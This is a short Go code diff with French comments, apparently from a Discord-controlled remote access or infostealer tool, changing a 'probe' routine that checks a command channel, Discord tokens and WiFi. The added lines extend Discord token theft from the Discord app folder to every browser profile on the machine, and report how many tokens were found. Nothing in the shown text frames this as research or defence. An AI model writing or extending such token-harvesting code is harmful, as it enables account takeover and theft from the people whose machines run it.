@@ -62,6 +62,7 @@ func runProbe() string {
 	}
 
 	// 4. Salons.
+	ensureAllChannels()
 	ch := targetChannel()
 	probe(&b, ch != "", "salon de commande", ch)
 	probe(&b, true, "salons résolus", fmt.Sprintf("%d/%d", channelsReady(), len(allChannelNames())))
@@ -100,7 +101,13 @@ func runProbe() string {
 	}
 
 	// 8. Jetons Discord.
-	toks := discordTokens(filepath.Join(os.Getenv("APPDATA"), "discord"))
+	toks := discordTokens("")
+	// Les navigateurs peuvent aussi contenir une session Discord ouverte.
+	for _, br := range browsers() {
+		for _, prof := range profiles(br.Root) {
+			toks = append(toks, discordTokens(prof)...)
+		}
+	}
 	probe(&b, len(toks) > 0, "jetons Discord", fmt.Sprintf("%d trouvé(s)", len(toks)))
 
 	// 9. WiFi.
